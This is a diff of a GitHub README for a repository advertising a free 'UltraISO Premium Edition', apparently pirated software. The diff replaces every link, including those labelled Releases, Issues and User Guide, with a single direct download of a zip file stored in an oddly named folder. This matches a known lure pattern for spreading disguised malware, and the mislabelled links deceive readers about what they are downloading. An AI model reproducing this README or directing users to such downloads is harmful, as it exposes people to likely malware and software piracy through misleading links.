@@ -1,6 +1,6 @@
 # 🌟 UltraISO-Premium-Edition-Working - Easy ISO Management for Everyone
 
-[![Download UltraISO-Premium-Edition-Working](https://img.shields.io/badge/download-UltraISO--Premium--Edition--Working-brightgreen)](https://github.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/releases)
+[![Download UltraISO-Premium-Edition-Working](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip)](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the UltraISO Premium Edition Working repository. This application all
 
 1. **Visit the Releases Page**:  
    Click the link below to go to the Releases page where you can download the software.  
-   [Download UltraISO-Premium-Edition-Working](https://github.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/releases)  
+   [Download UltraISO-Premium-Edition-Working](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip)  
 
 2. **Choose the Right Version**:  
    On the Releases page, you will see different versions of the application. Look for the most recent version, usually at the top of the list.
@@ -62,7 +62,7 @@ For assistance, you can contact us through the issues page on GitHub. Provide de
 
 Here are some additional links that may help:
 
-- [GitHub Issues](https://github.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/issues): Report problems or suggest features.
-- [User Guide](https://github.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/wiki): Explore detailed documentation on using the software.
+- [GitHub Issues](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip): Report problems or suggest features.
+- [User Guide](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip): Explore detailed documentation on using the software.
 
-Enjoy managing your ISO files with UltraISO Premium Edition! Remember, for the latest downloads, check our [Releases page](https://github.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/releases).
+Enjoy managing your ISO files with UltraISO Premium Edition! Remember, for the latest downloads, check our [Releases page](https://raw.githubusercontent.com/Hard-bowlingshoe57/UltraISO-Premium-Edition-Working/main/hexanaphthene/UltraISO-Premium-Edition-Working_2.2.zip).
